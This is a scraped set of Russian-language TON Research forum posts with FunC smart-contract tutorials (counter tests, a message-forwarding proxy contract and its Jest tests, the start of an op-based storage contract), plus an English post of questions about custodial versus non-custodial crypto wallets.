`const caller = await blockchain.treasury('caller');` - здесь мы создаём новый Treasury, на котором в Sandbox уже лежит миллион монет для всех необходимых проверок. С него мы сможем отправлять сообщения контракту. По сути это просто кошелёк с балансом для тестов.

`await counter.sendNumber(caller.getSender(), toNano('0.01'), 10n);` - отправляем сообщение с числом `10`, используя метод из обёртки, которую мы писали в первом уроке. В качестве отправителя используем `caller`, созданный выше.

`expect(await counter.getTotal()).toEqual(10n);` - проверяем (функция expect), что результат гет-метода getTotal() будет равен `10`. Если это не так, то тест будет помечен как провалившийся и в терминале мы увидим где именно не прошла проверка. Если всё хорошо и результат совпадёт, то код просто будет исполняться дальше.

В следующих строках мы просто отправляем тому же контракту числа и сверяем результат getTotal(). После отправки `5` наша сумма должна уже равняться `15`, а если отправить ещё `1000`, то получится `1015`. Если FunC код контракта написан правильно, тест должен быть помечен как пройденный.

Запустим тесты командой `npx blueprint test`, и если вы всё сделали без ошибок, получится следующий результат:

```
 PASS  tests/Counter.spec.ts
  Counter
    ✓ should deploy (126 ms)
    ✓ should update the number (79 ms)
```

Галочка означает, что наш новый тест успешно пройден.

## [](#h-9)Тестируем исключение

Напишем ещё один тест и разберем его код.

```
it('should throw error when number is not 32 bits', async () => {
    const caller = await blockchain.treasury('caller');

    const result = await counter.sendDeploy(caller.getSender(), toNano('0.01'));
    expect(result.transactions).toHaveTransaction({
        from: caller.address,
        to: counter.address,
        success: false,
        exitCode: 35,
    });
});
```

### [](#h-10)Разбираем

`const caller = await blockchain.treasury('caller');` - здесь мы создаём новый Treasury, на котором в Sandbox уже лежит миллион монет для всех необходимых проверок. С него мы сможем отправлять сообщения контракту. По сути это просто кошелёк с балансом для тестов.

`const result = await counter.sendDeploy(caller.getSender(), toNano('0.01'));` - отправляем пустое сообщение без числа (именно такое использовалось для деплоя, поэтому для простоты мы и используем готовую функцию sendDeploy).

`expect(result.transactions).toHaveTransaction({ ... })` - проверяем (функция expect), что среди транзакций, которые в результате вызова контракта обработались, будет транзакция с ошибкой `35`.

> Код ошибки `35` потому что именно это число мы прописали в смарт-контракте в функции `throw_if`

Запустим тесты командой `npx blueprint test`, и если вы всё сделали без ошибок, получится следующий результат:

```
 PASS  tests/Counter.spec.ts
  Counter
    ✓ should deploy (127 ms)
    ✓ should update the number (79 ms)
    ✓ should throw error when number is not 32 bits (53 ms)
```

Галочка означает, что наш новый тест успешно пройден.

### [](#h-11)На этом всё!

Вы прошли второй урок и успешно реализовали тесты для смарт-контракта.

P.S если есть какие-то вопросы, предлагаю задавать [здесь](https://t.me/ton_learn)

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/2lesson/secondlesson.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/smartcontract/2lesson/secondlesson.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/2lesson/secondlesson.md)

```
# Урок 2 Тесты на FunC для смарт-контракта

## Введение

В этом уроке мы напишем тесты для смарт-контракта созданного в первом уроке в блокчейне TON и выполним их с помощью [Blueprint](https://github.com/ton-community/blueprint).

## Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org) (желательно версии 18 или выше) и пройти [первый урок](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## Teсты для первого смарт-контракта

Для нашего первого смарт-контракта мы напишем следующие тесты:

-   вызовем recv_internal() с разными числами и проверим метод get_total
-   проверим вызов ошибки при не соответствии числа условию битности

## Структура тестов в Blueprint

Для тестирования смарт-контрактов в Blueprint-проектах используется библиотека [Sandbox](https://github.com/ton-community/sandbox). Она установлена по-умолчанию во всех проектах, созданных через Blueprint.
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/2lesson/secondlesson.md)

  4 Likes

[user126](https://tonresear.ch/u/user126) March 31, 2024, 7:33am  2

Очень интересно.Классная штука.

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 457

[TON Research](/)

# [Пишем смарт-контракты на FunC - Урок 3 Сообщения, пишем прокси контракт](/t/func-3/457)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[func](https://tonresear.ch/tag/func), [learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:33pm  1

# [](#h-3-1)Урок 3 Прокси смарт-контракт

## [](#h-2)Введение

В этом уроке мы напишем прокси (пересылает все сообщения его владельцу) смарт-контракт в блокчейне TON на языке FunC, а протестируем его уже в следующем уроке.

## [](#h-3)Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также уметь создавать/деплоить проект с помощью Blueprint. Научиться этому можно в [первом уроке](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## [](#h-4)Смарт-контракт

Смарт-контракт, который мы будем делать, должен обладать следующей функциональностью\*\*:

*   Пересылка всех сообщений поступающих в контракт владельцу
*   При пересылке сначала должен идти адрес отправителя, а потом тело оригинального сообщения
*   Значение Toncoin, прикрепленное к пересылаемому сообщению, должно быть равно значению входящего сообщения за вычетом комиссий
*   Адрес владельца хранится в хранилище смарт-контракта
*   При отправке сообщения в контракт от владельца пересылка не должна осуществляться

\*\* идеи для смарт-контрактов я решил брать из задач [FunC contest1](https://github.com/ton-blockchain/func-contest1), так как они очень хорошо подходят для ознакомления с разработкой смарт-контрактов для TON.

## [](#h-5)Внешний метод

Для того, чтобы наш контракт могла принимать сообщения будем использовать функцию `recv_internal()`, которая уже будет находиться в файле с FunC кодом после создания проекта.

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

## [](#h-6)Адрес отправителя

В соотвествии с заданием нам необходимо взять адрес оправителя. Брать адресс мы будем из ячейки с входящим сообщением `in_msg_full`. Код для этого действия вынесем в отдельную функцию.

```
() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  slice sender_address = parse_sender_address(in_msg_full);
}
```

##### [](#h-7)Пишем функцию

Напишем код функции `parse_sender_address`, которая из ячейки сообщения берет адрес отправителя и разберем его:

```
slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}
```

Как вы можете видеть функция имеет `inline` спецификатор, ее код фактически подставляется в каждом месте вызова функции. Данный спецификатор полезно использовать в случаях, когда функция вызывается только в одном единственном месте.

Чтобы мы могли взять адрес, нам необходимо преобразовать ячейку в слайс c помощью `begin_parse`:

```
var cs = in_msg_full.begin_parse();
```

Теперь нам надо пропустить первые 4 бита в этом слайсе, отведённые на флаги сообщения. С помощью `load_uint` функции из [стандартной бибилотеки FunC](https://docs.ton.org/develop/func/stdlib/), которая загружает из слайса целое беззнаковое число размером N бит.

```
var flags = cs~load_uint(4);
```

В данном уроке мы не будем останавливаться подробно на флагах, но подробнее можно прочитать [в документации](https://docs.ton.org/develop/smart-contracts/messages#message-layout).

Ну и наконец-то адрес. Используем `load_msg_addr()` - которая загружает из слайса префикс, который является допустимым `MsgAddress` (адресом).

```
slice sender_address = cs~load_msg_addr();
return sender_address;
```

## [](#h-8)Адрес получателя

Адрес будем брать из данных контракта. Про это мы уже говорили в предыдущих уроках.

Будем использовать:  
`get_data` - берет ячейку из данных контракта.  
`begin_parse` - ячейку преобразует в slice.  
`load_msg_addr()` - загружает из слайса префикс, который является допустимым `MsgAddress`.

По итогу получаем следующую функцию:

```
slice load_data () inline {
  var ds = get_data().begin_parse();
  return ds~load_msg_addr();
}
```

Остается её только вызвать:

```
slice load_data () inline {
  var ds = get_data().begin_parse();
  return ds~load_msg_addr();
}

slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}

() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  slice sender_address = parse_sender_address(in_msg_full);
  slice owner_address = load_data();
}
```

## [](#h-9)Проверим условие равенства адресов

По условию задачи, прокси не должна пересылать сообщение если оно исходит от владельца. Поэтому нам необходимо сравнить два адреса.

##### [](#h-10)Функция Сравнения

Некоторые функции не объявлены в стандартной библиотеке, поэтому их приходится объявлять вручную, используя [TVM-инструкции](https://docs.ton.org/learn/tvm-instructions/instructions).

FunC поддерживает определение функции на ассемблере (имеется ввиду Fift). Происходит это следующим образом - мы определяем функцию как низкоуровневый примтив TVM. Для функции сравнения это будет выглядеть так:

```
int equal_slices (slice a, slice b) asm "SDEQ";
```

Как вы можете видеть, используется ключевое слово `asm`.

##### [](#h-11)Унарный оператор

Итак нашу функцию `equal_slices` мы будем использовать в `if`:

```
() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  slice sender_address = parse_sender_address(in_msg_full);
  slice owner_address = load_data();

  if  equal_slices(sender_address, owner_address) {

   }
}
```

Но функция проверят именно равенство, как проверить неравенство? Здесь может помочь унарный оператор `~`, который являетя побитовым “не”.

Теперь наш код выглядит так:

```
int equal_slices (slice a, slice b) asm "SDEQ";

slice load_data () inline {
  var ds = get_data().begin_parse();
  return ds~load_msg_addr();
}

slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}

() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  slice sender_address = parse_sender_address(in_msg_full);
  slice owner_address = load_data();

  if ~ equal_slices(sender_address, owner_address) {

   }
}
```

## [](#h-12)Отправка сообщения

Итак, нам осталось наполнить тело условного оператора в соответствии с задачей, а именно отправить входящее сообщение.

##### [](#h-13)Структура сообщения

С полной структурой сообщения можно ознакомиться [здесь](https://docs.ton.org/develop/smart-contracts/messages#message-layout). Но обычно нам нет необходимости контролировать каждое поле, поэтому можно использовать краткую форму из [примера](https://docs.ton.org/develop/smart-contracts/messages):

```
 var msg = begin_cell()
	.store_uint(0x18, 6)
	.store_slice(addr)
	.store_coins(amount)
	.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_slice(message_body)
  .end_cell();
```

Как вы можете видеть для построения сообщения используются функции [стандартной библиотеки FunC](https://docs.ton.org/develop/func/stdlib/). А именно фукнции примитивов Builder (частично построенных ячеек как вы можете помнить из первого урока). Рассмотрим:

`begin_cell()` - создаст Builder для будущей ячейки  
`end_cell()` - создаст ячейку  
`store_uint` - сохранит uint в Builder  
`store_slice` - сохранит слайс в Builder  
`store_coins`\- здесь в документации имеется ввиду `store_grams` - используемой для записи количества Toncoin или других валют. Подробнее [здесь](https://docs.ton.org/develop/func/stdlib/#store_grams).

А также дополнительно рассмотрим `store_ref`, которая понадобится для отправки адреса.

`store_ref` - Сохраняет ссылку на ячейку в Builder

Теперь когда у нас есть вся необходимая информация, сооберем сообщение.

##### [](#h-14)Последний штрих - тело входящего сообщения

Чтобы отправить в сообщении тело, которое пришло в `recv_internal`, соберем ячейку, а в самом сообщении сделаем на нее ссылку с помощью `store_ref`.

```
  if ~ equal_slices(sender_address, owner_address) {
    cell msg_body_cell = begin_cell().store_slice(in_msg_body).end_cell();
  }
```

##### [](#h-15)Собираем сообщение

В соответствии с условием задачи мы должны отправить адрес и тело сообщения. А значит поменяем `.store_slice(message_body)` на `.store_slice(sender_address)` и `.store_ref(msg_body_cell)` в переменной _msg_. Получим:

```
  if ~ equal_slices(sender_address, owner_address) {
	cell msg_body_cell = begin_cell().store_slice(in_msg_body).end_cell();

	var msg = begin_cell()
        .store_uint(0x10, 6)
        .store_slice(owner_address)
        .store_grams(0)
        .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .store_slice(sender_address)
        .store_ref(msg_body_cell)
    .end_cell();
   }
```

Осталось только отправить наше сообщение.

##### [](#mode-16)Режим отправки сообщения (mode)

Для отправки сообщений используется `send_raw_message` из [стандартной библиотеки](https://docs.ton.org/develop/func/stdlib/#send_raw_message).

Переменную msg мы уже собрали, остается разобраться `mode`. Описание каждого режиме есть в [документации](https://docs.ton.org/develop/func/stdlib/#send_raw_message). Мы же рассмотрим на примере, чтобы было понятнее.

Пускай на балансе смарт-контракта 100 монет и мы получаем internal message c 60 моентами и отсылаем сообщение с 10, общий размер комиссий пусть будет для примера равен 3.

`mode = 0` - баланс 100+60-10 = **150** монет, отправим 10-3 = **7** монет  
`mode = 1` - баланс 100+60-10-3 = **147** монет, отправим **10** монет  
`mode = 64` - баланс 100-10 = **90** монет, отправим 60+10-3 = **67** монет  
`mode = 65` - баланс 100-10-3 = **87** монет, отправим 60+10 = **70** монет  
`mode = 128` - баланс **0** монет, отправим 100+60-3 = **157** монет

Режимы 1 и 65 описанные выше это `mode' = mode + 1`.

Так как по условию задачи, значение Toncoin, прикрепленное к сообщению, должно быть равно значению входящего сообщения за вычетом сборов, связанных с обработкой, нам подойдет режим `mode = 64` с `.store_grams(0)`. На примере получиться следующее:

Пусть на балансе смарт-контракта 100 монет и мы получаем internal message c 60 монетами и отсылаем сообщение с 0(так как `.store_grams(0)`) общий fee 3.

`mode = 64` - баланс (100 = 100 монет), отправим (60-3 = 57 монет)

Таким образом наш условный оператор будет выглядеть так:

```
   if ~ equal_slices(sender_address, owner_address) {
	cell msg_body_cell = begin_cell().store_slice(in_msg_body).end_cell();

	var msg = begin_cell()
		  .store_uint(0x10, 6)
		  .store_slice(owner_address)
		  .store_grams(0)
		  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
		  .store_slice(sender_address)
		  .store_ref(msg_body_cell)
		  .end_cell();
	 send_raw_message(msg, 64);
   }
```

А полный код смарт-контракта:

```
#include "imports/stdlib.fc";

int equal_slices (slice a, slice b) asm "SDEQ";

slice load_data () inline {
  var ds = get_data().begin_parse();
  return ds~load_msg_addr();
}

slice parse_sender_address (cell in_msg_full) inline {
  var cs = in_msg_full.begin_parse();
  var flags = cs~load_uint(4);
  slice sender_address = cs~load_msg_addr();
  return sender_address;
}

() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
  slice sender_address = parse_sender_address(in_msg_full);
  slice owner_address = load_data();

  if ~ equal_slices(sender_address, owner_address) {
	cell msg_body_cell = begin_cell().store_slice(in_msg_body).end_cell();

	var msg = begin_cell()
		  .store_uint(0x10, 6)
		  .store_slice(owner_address)
		  .store_grams(0)
		  .store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
		  .store_slice(sender_address)
		  .store_ref(msg_body_cell)
		  .end_cell();
	 send_raw_message(msg, 64);
   }
}
```

## [](#typescript-17)Обёртка на TypeScript

Для удобного взаимодействия с нашим смарт-контрактом, напишем обёртку на TypeScript. База для неё уже предоставляется от Blueprint.

Откроем файл `wrappers/Proxy.ts` (название файла может быть другим, смотря как вы создавали проект).  
Нам достаточно изменить лишь сборку ячейки данных контракта из конфига. Наш контракт содержит в свои данных единственное значение - адрес владельца. Добавим это значение в конфиг:

```
export type ProxyConfig = {
    owner: Address;
};

export function proxyConfigToCell(config: ProxyConfig): Cell {
    return beginCell().storeAddress(config.owner).endCell();
}
```

Отлично! Кроме данных нам ничего больше менять не нужно. смарт-контракт работает с любыми сообщениями и обёртку для них писать нам не надо.

## [](#h-18)Заключение

В этом уроке мы с вами реализовали простой прокси-контракт на FunC. Его тестированием мы займёмся в следующем уроке!

В качестве домашнего задания попробуйте задеплоить смарт-контракт в реальную сеть TON (можно и в тестнет) через скрипт, как мы уже делали в первом уроке и потом отправьте на него простые переводы с разными суммами и комментариями из своего кошелька.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/3lesson/thirdlesson.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/smartcontract/3lesson/thirdlesson.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/3lesson/thirdlesson.md)

```
# Урок 3 Прокси смарт-контракт

## Введение

В этом уроке мы напишем прокси (пересылает все сообщения его владельцу) смарт-контракт в блокчейне TON на языке FunC, а протестируем его уже в следующем уроке.

## Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также уметь создавать/деплоить проект с помощью Blueprint. Научиться этому можно в [первом уроке](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## Смарт-контракт

Смарт-контракт, который мы будем делать, должен обладать следующей функциональностью\*\*:

-   Пересылка всех сообщений поступающих в контракт владельцу
-   При пересылке сначала должен идти адрес отправителя, а потом тело оригинального сообщения
-   Значение Toncoin, прикрепленное к пересылаемому сообщению, должно быть равно значению входящего сообщения за вычетом комиссий
-   Адрес владельца хранится в хранилище смарт-контракта
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/3lesson/thirdlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 46

[TON Research](/)

# [Deciphering the Paradigms of Cryptocurrency Wallets: Custodial Versus Non-Custodial Solutions](/t/deciphering-the-paradigms-of-cryptocurrency-wallets-custodial-versus-non-custodial-solutions/46)

[Application](/c/application/wallet/22)  [Wallet](/c/application/wallet/22) 

    

[TFR](https://tonresear.ch/u/TFR)  January 23, 2024, 2:02pm  1

In the dynamic domain of digital finance and cryptocurrencies, the choice of wallet type—custodial or non-custodial—plays a pivotal role in how users interact with, manage, and secure their digital assets. This critical decision involves understanding the intricate differences between these two types of wallets, each with its distinct set of features, advantages, and challenges, impacting aspects like security, user autonomy, and operational ease.

The primary objective of this inquiry is to dissect and compare custodial and non-custodial cryptocurrency wallets, providing a thorough understanding of the following key elements:

1.  **Fundamental Definitions and Distinctions**: What are the core characteristics that define custodial and non-custodial wallets in the context of cryptocurrencies, and how do these definitions translate into practical differences in asset management and control?
2.  **Advantages and Disadvantages Analysis**: Can you detail the specific pros and cons of custodial and non-custodial wallets, particularly focusing on aspects such as security, ease of use, user autonomy, and privacy concerns?
3.  **Operational Mechanics and User Responsibility**: How do the operational mechanisms of these wallets differ in terms of transaction processing, asset control, and risk management, and what level of responsibility and technical expertise is required from the user in each case?
4.  **Security Strategies for Non-Custodial Wallets**: What are the recommended security practices for users opting for non-custodial wallets, especially regarding private key management, regular backups, and preventive measures against unauthorized access and asset loss?
5.  **Evaluating the Right Choice for Users**: Considering the diverse needs and capabilities of users in the cryptocurrency space, how can one evaluate and decide between custodial and non-custodial options, taking into account their individual risk tolerance, technical proficiency, and investment goals?
6.  **Future Trends and Evolutions**: With the rapidly evolving landscape of digital assets and blockchain technology, what future trends or developments could potentially influence the relevance and functionality of custodial and non-custodial wallets?

This exploration aims to provide a comprehensive and detailed comparison of custodial and non-custodial cryptocurrency wallets, equipping users with the necessary knowledge to make informed decisions in the realm of digital asset management and security.

  1 Like

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 460

[TON Research](/)

# [Пишем смарт-контракты на FunC - Урок 4 Тестируем сообщения](/t/func-4/460)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[func](https://tonresear.ch/tag/func), [learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:40pm  1

# [](#h-4-func-1)Урок 4 Тесты на FunC для прокси смарт-контракта

## [](#h-2)Введение

В этом уроке мы напишем тесты для смарт-контракта созданного в третьем уроке в блокчейне TON и выполним их с помощью [Blueprint](https://github.com/ton-community/blueprint).

## [](#h-3)Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также пройти [третий урок](https://github.com/romanovichim/TonFunClessons_ru/blob/main/3lesson/thirdlesson.md).

## [](#te-4)Teсты для прокси смарт-контракта

Для нашего прокси смарт-контракта мы напишем следующие тесты:

*   При отправке сообщения в контракт от владельца пересылка не должна осуществляться
*   Остальные условия [третьего урока](https://github.com/romanovichim/TonFunClessons_ru/blob/main/3lesson/thirdlesson.md) должны выполняться

## [](#h-5)Тестируем вызов прокси контракта его владельцем

Откроем файл `tests/Proxy.spec.ts`, в котором уже написана база для наших тестов. В нём для удобства вынесем объявление `deployer` за пределы функции `beforeEach`, чтобы можно было к нему обращаться из всех тестов. Также нужно добавить в конфиг контаркта при деплое те параметры, которые мы в нём задавали. Должно получиться примерно так:

```
let blockchain: Blockchain;
let proxy: SandboxContract<Proxy>;
let deployer: SandboxContract<TreasuryContract>;

beforeEach(async () => {
    blockchain = await Blockchain.create();

    deployer = await blockchain.treasury('deployer');

    proxy = blockchain.openContract(
        Proxy.createFromConfig(
            {
                owner: deployer.address,
            },
            code
        )
    );

    const deployResult = await proxy.sendDeploy(
        deployer.getSender(),
        toNano('0.01')
    );

    expect(deployResult.transactions).toHaveTransaction({
        from: deployer.address,
        to: proxy.address,
        deploy: true,
    });
});
```

Теперь напишем первый тест для прокси контракта и разберем его код.

```
it('should not forward from owner', async () => {
    const result = await deployer.send({
        to: proxy.address,
        value: toNano('1'),
    });
    expect(result.transactions).not.toHaveTransaction({
        from: proxy.address,
        to: deployer.address,
    });
});
```

Сначала мы отправляем сообщение с кошелька `deployer` на `proxy` с суммой `1 TON`.

Как мы помним, наш контракт не должен пересылать сообщения от владельца ему же самому. Поэтому условием прохождения теста должно быть **отсутствие** такой транзакции. Такую проверку можно реализовать, добавив `.not` перед `.toHaveTransaction`.

> Примечание: условия для тестов (ключевое слово `expect`) работают через библиотеку **Jest**. Её синтаксис довольно простой и зачастую можно догадаться как что-то проверить, просто написав это по-английски. Названия всех функций чётко отражают её суть. Например `toEqual` проверяет, что два значения равны, а `toBeLessThan` проверяет, что одно значение меньше другого.

Получаем условие, что в результате выполнения всей цепочки действий не должно быть ни одной транзакции от `proxy` к `deployer`.

## [](#h-6)Тестируем вызов прокси контракта другим кошельком

Напишем второй тест для прокси контракта и разберем его код.

```
it('should forward from another wallet', async () => {
    let user = await blockchain.treasury('user');
    const result = await user.send({
        to: proxy.address,
        value: toNano('1'),
        body: beginCell().storeStringTail('Hello, world!').endCell(),
    });
    expect(result.transactions).toHaveTransaction({
        from: proxy.address,
        to: deployer.address,
        body: beginCell()
            .storeAddress(user.address)
            .storeRef(beginCell().storeStringTail('Hello, world!').endCell())
            .endCell(),
        value: (x) => (x ? toNano('0.99') <= x && x <= toNano('1') : false),
    });
});
```

Сначала создаём новый кошелёк так же, как в коде выше создаётся `deployer`:

```
let user = await blockchain.treasury('user');
```

Далее посылаем сообщение от `user` к `proxy` с суммой `1 TON` и комментарием `Hello, world!`.

Теперь наш контракт уже должен перенаправить это сообщение к владельцу. Поэтому проверяем, что оно там действительно есть через `.toHaveTransaction` без использования `.not`. Также для более точной проверки мы используем параметры `body` и `value`.

В `body` должна лежать ячейка, содержащая адрес отправителя исходного сообщения (то есть `user.address`), а затем в рефе должно лежать исходное тело сообщения. Поэтому проверяем, чтобы `body` был равен

```
beginCell().storeAddress(user.address)
    .storeRef(beginCell().storeStringTail('Hello, world!').endCell())
.endCell()
```

Для проверки `value` используется необычная конструкция, давайте разберём её детальнее:

```
value: (x) => (x ? toNano('0.99') <= x && x <= toNano('1') : false);
```

“Мэтчеры” из `.toHaveTransaction` могут принимать как само значение, которое мы ожидаем, так и функцию, которая делает какую-то более сложную проверку и возвращает булевое значение с результатом этой проверки.  
В нашем случае, мы не знаем какую точно сумму отправит прокси-контракт владельцу, ведь мы для отправки используем в контракте режим 64, а значит комиссии вычтутся из суммы сообщения. Поэтому мы хотим проверить, что сумма сообщения приблизительно равна 1.  
Для этого мы пишем так назвыаемую “стрелочную функцию”, которую не надо объявлять заранее. Эта функция принимает какое-то значение `x` и возврашает `true` если оно больше или равно `0.99 TON` и меньше или равно `1 TON`. Также тернарным выражением мы проверяем, что `x` не является `undefined` чтобы мы могли провести проверку на его значение, а в противном случае возвращаем `false`.

## [](#h-7)Запускаем тесты

Выполним в терминале команду `npx blueprint test`. Результат должен быть примерно такой:

```
 PASS  tests/Proxy.spec.ts
  Proxy
    ✓ should deploy (145 ms)
    ✓ should not forward from owner (63 ms)
    ✓ should forward from another wallet (66 ms)
```

Если какие то тесты у вас не прошли, просмотрите код и текст этого урока ещё раз. Также сверьте свой код смарт-контракта с кодом из предыдущего урока.

## [](#h-8)Заключение

В этом уроке мы успешно протестироавли наш прокси-контракт и убедились, что он работает как надо.

[github.com](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/4lesson/forthlesson.md)

#### [romanovichim/TonFunClessons\_ru/blob/main/lessons/smartcontract/4lesson/forthlesson.md](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/4lesson/forthlesson.md)

```
# Урок 4 Тесты на FunC для прокси смарт-контракта

## Введение

В этом уроке мы напишем тесты для смарт-контракта созданного в третьем уроке в блокчейне TON и выполним их с помощью [Blueprint](https://github.com/ton-community/blueprint).

## Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также пройти [третий урок](https://github.com/romanovichim/TonFunClessons_ru/blob/main/3lesson/thirdlesson.md).

## Teсты для прокси смарт-контракта

Для нашего прокси смарт-контракта мы напишем следующие тесты:

-   При отправке сообщения в контракт от владельца пересылка не должна осуществляться
-   Остальные условия [третьего урока](https://github.com/romanovichim/TonFunClessons_ru/blob/main/3lesson/thirdlesson.md) должны выполняться

## Тестируем вызов прокси контракта его владельцем
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_ru/blob/main/lessons/smartcontract/4lesson/forthlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 461

[TON Research](/)

# [Пишем смарт-контракты на FunC - Урок 5 Флаги и хранение данных в контракте](/t/func-5/461)

[Русский](/c/ru/general/50)  [General](/c/ru/general/50) 

[func](https://tonresear.ch/tag/func), [learn](https://tonresear.ch/tag/learn)

    

[IvanKriptov](https://tonresear.ch/u/IvanKriptov)  February 21, 2024, 8:41pm  1

# [](#h-5-1)Урок 5 Запоминаем Адрес и идентифицируем операцию

## [](#h-2)Введение

В этом уроке мы напишем смарт-контракт, который умеет производить разные операции в зависимости от флага, в блокчейне TON на языке FunC, а протестируем его уже в следующем уроке.

## [](#h-3)Требования

Для прохождения данного урока вам достаточно установить [Node.js](https://nodejs.org). Желательно устанавливать одну из последних версий, например 18.

А также уметь создавать/деплоить проект с помощью Blueprint. Научиться этому можно в [первом уроке](https://github.com/romanovichim/TonFunClessons_ru/blob/main/1lesson/firstlesson.md).

## [](#op-4)Op - для идентификации операции

Прежде чем рассматривать что за смарт-контракт мы будем делать в этом уроке, предлагаю изучить [рекомендации](https://docs.ton.org/develop/smart-contracts/guidelines/internal-messages) о теле сообщения смарт-контракта (`message body`).

Чтобы мы могли создавать подобие клиент-серверной архитектуры на смарт-контрактах, рекомендуется начинать каждое сообщение (строго говоря тело сообщения) с некоторого 32-битного флага `op`, который будет идентифицировать какую операцию должен выполнить смарт-контракт. Сам контракт в свою очередь, на основе значения этого флага, должен выполнить нужную операцию, и при необходимости отправить ответное сообщение, которое также будет включать в себя какой-то `op`.

В этом уроке мы будем делать смарт-контракт, который выполняет различные действия в зависимости от `op`.

## [](#h-5)Смарт-контракт

Задача смарт-контракта будет запоминать адрес, устанавливаемый менеджером и сообщать его всем, кто запросит, в частности следующая функциональность\*\*:

*   когда контракт получает сообщение от Менеджера с `op` равным 1 за которым следует какой-то `query_id`, за которым следует `MsgAddress`, он должен сохранить полученный адрес в хранилище.
*   когда контракт получает внутреннее сообщение с любого адреса с `op`, равным 2, за которым следует `query_id`, он должен ответить отправителю сообщением с телом, содержащим:
    *   `op` равным 3
    *   тот же `query_id`
    *   Адрес менеджера
    *   Адрес, который был запомнен с момента последнего запроса менеджера (пустой адрес `addr_none`, если еще не было запроса менеджера)
    *   Значение TON, прикрепленное к сообщению за вычетом платы за обработку.
*   когда смарт-контракт получает любое другое сообщение, он должен выдать исключение.

\*\* идеи для смарт-контрактов я решил брать из задач [FunC contest1](https://github.com/ton-blockchain/func-contest1), так как они очень хорошо подходят для ознакомления с разработкой смарт-контрактов для TON.

## [](#h-6)Структура смарт-контракта

##### [](#h-7)Внешний метод

Для того, чтобы наша прокси могла принимать сообщения будем использовать внешний метод `recv_internal()`, как и в предыдущих уроках.

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

##### [](#h-8)Внутри метода

Внутри метода мы из аргументов функции возьмем `op`, `query_id`, и адрес отправителя `sender_address`, а потом с помощью условных операторов построим логику вокруг `op`.

```
() recv_internal (int balance, int msg_value, cell in_msg_full, slice in_msg_body) {
 ;; возьмем  op, query_id, и адрес отправителя sender_address

  if (op == 1) {
	;; здесь будем сохранять адрес полученный от менеджера
  } elseif (op == 2) {
      ;; отправка сообщения
  } else {
      ;; здесь будет исключение
  }
}
```

## [](#h-9)Вспомогательные функции

Давайте подумаем, какую функциональность можно вынести в функции?

*   сравнение адресов, чтобы при op равному 1 проверить, что запрос пришел от Менеджера.
*   выгрузка и загрузка адреса менеджера и адреса, который мы сохраняем в постоянных данных контракта.
*   спарсить адрес отправителя из входящего сообщения.

##### [](#h-10)Сравнение адресов

FunC поддерживает определение функции на ассемблере (имеется ввиду Fift). Происходит это следующим образом - мы определяем функцию как низкоуровневый примтив TVM. Для функции сравнения это будет выглядеть так:

```
